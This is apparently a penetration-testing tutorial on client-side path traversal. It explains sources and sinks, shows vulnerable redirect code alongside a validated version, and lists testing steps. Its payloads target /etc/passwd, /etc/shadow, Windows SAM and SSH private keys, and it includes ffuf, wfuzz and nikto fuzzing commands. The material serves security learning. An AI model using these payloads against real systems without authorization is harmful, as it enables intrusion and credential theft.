
### Basic info

Client-side path traversal is a serious **security vulnerability** that occurs when an attacker manipulates file paths in web applications to gain unauthorized access to files stored on the **client-side or server-side**. Unlike traditional **server-side path traversal attacks**, client-side path traversal exploits weaknesses in web browsers, JavaScript, or local file access mechanisms. This flaw can lead to **sensitive data exposure, code execution, and other security breaches**.

In web applications, developers sometimes use **client-side scripts** to access and manipulate file paths dynamically. This can lead to vulnerabilities if **user input is not properly sanitized**. When a web application allows users to specify file paths without strict validation, an attacker can craft malicious inputs to access restricted files.



Practice:

GitHub - doyensec/CSPTPlayground: CSPTPlayground is an open-source playground to find and exploit Client-Side Path Traversal (CSPT).

https://github.com/doyensec/CSPTPlayground

---


https://blog.doyensec.com/2024/07/02/cspt2csrf.html

https://medium.com/@karimelsayed0x1/01-path-traversal-0c52daffd26e

---

Common techniques include:

- **Modifying URL parameters** to access unintended directories.
- **Tampering with JavaScript-based file access** mechanisms.
- **Leveraging browser exploits** to bypass security restrictions.

### Impact of Client-Side Path Traversal Vulnerabilities

The consequences of a successful **client-side path traversal attack** can be severe:

- **Unauthorized access to files:** Attackers can read sensitive **local or remote files**.
- **Cross-site scripting (XSS):** Path traversal flaws can lead to **XSS attacks** when combined with improper JavaScript execution.
- **Local file inclusion (LFI):** In some cases, attackers may execute malicious scripts by including unintended files.
- **Code execution:** If exploited correctly, attackers may execute arbitrary code on the victim's device.

### Description

Nowadays, it is common to have a web application architecture with a back-end API and a dynamic front end such as React or Angular.

![None](https://miro.medium.com/v2/resize:fit:700/0*92DW2B4s3bsQLL-y)

In this context, an attacker with control over the {USER_INPUT} value can perform a path traversal in order to route the victim's request to another endpoint.

![None](https://miro.medium.com/v2/resize:fit:700/0*foqA3GESD8DNjr9Y)

An attacker can coerce a victim into executing this unexpected request. This is the starting point of a Client-Side Path Traversal (CSPT).

A Client-Side Path Traversal can be split into two parts. The source is the trigger of the CSPT, while the sinks are the exploitable endpoints that can be reached by this CSPT.

In order to understand how we can use CSPT as an attack vector, both source and sink must be defined.

### Analyze Web Requests for File Paths

Use **Burp Suite, OWASP ZAP, or DevTools** (`F12` → Network Tab) to inspect requests containing file paths.

**Look for file parameters in URLs:**

> https://example.com/getFile?path=/user/docs/report.pdf

**Check if JavaScript fetches files:**

```
fetch("/api/getFile?name=report.pdf")
```

### Inspect JavaScript for File Path Manipulation

Download all JavaScript files for analysis:

```bash
wget -r -A .js https://example.com/
```

Search for functions handling file paths:

```perl
grep -rnw '.' -e 'file'
grep -rnw '.' -e 'path'
grep -rnw '.' -e 'fetch'
grep -rnw '.' -e 'XMLHttpRequest'
```

If you find:

```javascript
document.write('<img src="' + userInput + '">');
```

This **may be vulnerable** to path manipulation.

### Static Code Analysis

If you have access to JavaScript files, search for **dangerous functions**:

```perl
grep -rnw '.' -e 'eval'
grep -rnw '.' -e 'document.write'
grep -rnw '.' -e 'innerHTML'
grep -rnw '.' -e 'window.location'
```

Example **vulnerable code**:

```javascript
let file = getParameterByName("file"); 
window.location.href = "/documents/" + file;
```

1. **User Input Manipulation**: The code takes a parameter directly from the URL (`getParameterByName("file")`) without validating it. This means an attacker could manipulate the URL to include a malicious or unintended value.
    
2. **Direct URL Redirect**: It then immediately uses this parameter to redirect the user to a new URL (`window.location.href = "/documents/" + file`). If the `file` parameter contains a path or URL that points to a malicious website, the code will redirect the user to that site, potentially exposing them to phishing or other malicious activities.
    

Here's an example of how an attacker might exploit this vulnerability:

```html
https://example.com?file=//malicious-website.com

```

he code would then redirect the user to `https://malicious-website.com` instead of a legitimate document on the original site.

To secure this code, you should:

1. **Validate User Input**: Ensure that the `file` parameter only contains safe, expected values. This could involve checking against a whitelist of allowed file names.
    
2. **Sanitize Input**: Remove any potentially harmful characters or patterns from the user input.
    
3. **Use Relative Paths**: Ensure that only relative paths are allowed, preventing redirects to external sites.
    

Here's an example of a more secure approach:  **(by copilot)**

```javascript
let file = getParameterByName("file");
if (isValidFileName(file)) {
  window.location.href = "/documents/" + file;
} else {
  console.error("Invalid file name");
}

function isValidFileName(fileName) {
  // Implement your validation logic here
  return /^[a-zA-Z0-9_\-]+$/.test(fileName); // Simple example: allow only alphanumeric characters, underscores, and hyphens
}
		      // code generated by copilot
```

	This approach ensures that the `file` parameter is checked for validity before being used in the redirect.

**Try modifying the parameter** to escape directories:

```ini
file=../../../../etc/passwd
file=../../../../windows/win.ini
```

### Testing for Path Traversal in File Requests

#### Modify File Path Parameters

Find URLs with file parameters and modify them.

Original request:

```sql
GET /download?file=user-report.pdf
```

**Test with Path Traversal:**

```bash
GET /download?file=../../../../etc/passwd
GET /download?file=../../../../windows/win.ini
```

If the response contains file contents, it's vulnerable!

#### Intercept Requests with Burp Suite

- Open **Burp Suite → Proxy → Intercept Request**
- Modify:

```bash
file=../../../../etc/shadow file=../../../../etc/hosts
```

#### Automate Path Traversal Testing

Use **ffuf** to fuzz the `file` parameter:

```bash
ffuf -u "https://example.com/download?file=FUZZ" -w payloads.txt
```

Example **payloads.txt**:

```bash
../../../../etc/passwd
../../../../windows/system32/config/SAM
../../../../var/log/syslog
../../../../root/.ssh/id_rsa
```

### Manipulating Browser-Based File Access

#### Try Loading Local Files

Open **DevTools Console (****`F12`****)** and run:

```scss
fetch("file:///etc/passwd")
```

If this succeeds, the application allows **local file access**.

#### Modify Fetch Requests in Console

If you find:

```scss
fetch("/files/user-data.json")
```

Test modifying it:

```scss
fetch("/files/../../../../etc/passwd")
```

#### Use `XMLHttpRequest` to Fetch Local Files

```javascript
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "../../../../etc/passwd", false);
xhttp.send();
console.log(xhttp.responseText);
```

### Testing Web Storage (LocalStorage, SessionStorage)

#### Check for Stored File Paths

In **DevTools Console (****`F12`****)**, run:

```javascript
console.log(localStorage);
console.log(sessionStorage);
console.log(document.cookie);
```

#### Modify Stored Paths

If a file path is stored in `localStorage`, modify it:

```javascript
localStorage.setItem('configPath', '../../../../etc/passwd');
sessionStorage.setItem('userFile', '../../../../windows/system32/config/SAM');
```

Then **refresh the page** and check if the file loads.

### Exploiting Weak Browser Security Policies

#### Check Content Security Policy (CSP)

Open **DevTools (****`F12`****) → Network → Headers** Look for:

```csharp
Content-Security-Policy: default-src 'self'
```

If it **allows** **`file://`** **URLs**, it may be exploitable.

#### Inject JavaScript to Load Arbitrary Files

```javascript
let script = document.createElement('script');
script.src = '../../../../etc/passwd';
document.body.appendChild(script);
```

### Automated Path Traversal Scanning

### Nikto (Quick Scanner)

```bash
nikto -h https://example.com
```

### wfuzz (Path Traversal Fuzzing)

```bash
wfuzz -c -z file,wordlist.txt --hh 404 "https://example.com/download?file=FUZZ"
```

----
